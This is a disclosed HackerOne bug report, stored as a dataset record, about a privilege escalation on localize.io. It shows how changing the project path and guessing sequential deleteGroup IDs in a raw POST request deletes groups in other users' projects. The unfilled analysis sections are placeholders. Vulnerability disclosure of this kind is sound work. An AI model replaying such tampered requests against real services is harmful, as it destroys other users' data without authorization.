---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '8104'
original_report_id: '8104'
title: Deleting groups in any project without permission
weakness: Privilege Escalation
team_handle: localize
created_at: '2014-04-19T04:07:53.082Z'
disclosed_at: '2014-04-20T02:52:09.062Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- privilege-escalation
---

# Deleting groups in any project without permission

## Metadata

- HackerOne Report ID: 8104
- Weakness: Privilege Escalation
- Program: localize
- Disclosed At: 2014-04-20T02:52:09.062Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

If you can make a group then why can't you delete the group :P 

With same method of creating the group you can delete the group 
But have some restrictions :/ :

1) in any project you ll not get to know the deleteGroup[id] 
2) May be I'm only one who is making groups now so i can assume the deleteGroup[id] like 96,97,98 :P

POST /pages/create_project/3F HTTP/1.1
Host: www.localize.io
User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:28.0) Gecko/20100101 Firefox/28.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://www.localize.io/pages/create_project/82
Cookie: PHPSESSID=srdrqpfu6k679bna6e2rtrsrq7
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 81

CSRFToken=NTc4NTUxMjY1MzUxZTllOGIwYWM4MC4yMjE1MjUxNw%3D%3D&deleteGroup%5Bid%5D=95

Now he ll change the POST /pages/create_project/3F with POST /pages/create_project/8h and the deleteGroup[id] .

and send the request and group ll be deleted.

Take a look and lemme know if you need more info .

Daksh

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
